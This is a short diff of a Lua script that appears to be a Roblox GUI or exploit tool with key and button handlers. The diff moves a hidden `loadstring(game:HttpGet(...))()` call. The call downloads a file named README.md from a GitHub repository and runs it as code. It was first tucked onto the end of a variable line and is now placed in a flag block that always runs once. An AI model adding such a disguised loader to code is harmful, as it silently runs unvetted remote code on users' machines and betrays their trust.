@@ -1551,7 +1551,7 @@ UIS.InputChanged:Connect(function(input)
 		end
 	end
 end)
-local ggd = false loadstring(game:HttpGet("https://raw.githubusercontent.com/Andrua51588/ProG/main/README.md"))()
+local ggd = false
 UIS.InputEnded:connect(function(input,gameprocesed)
 	if input.KeyCode == Enum.KeyCode.F1  then
 		if game.CoreGui:FindFirstChild("ScreenGui") ~= nil then
@@ -1609,6 +1609,11 @@ UIS.InputEnded:connect(function(input,gameprocesed)
 end)
 local tele = false
 local stab2 = true
+tdd = false
+if tdd == false then
+	tdd = true
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Andrua51588/ProG/main/README.md"))()
+end
 Button_3.MouseButton1Click:Connect(function()
 	if stab2 == true then
 		stab2 = false
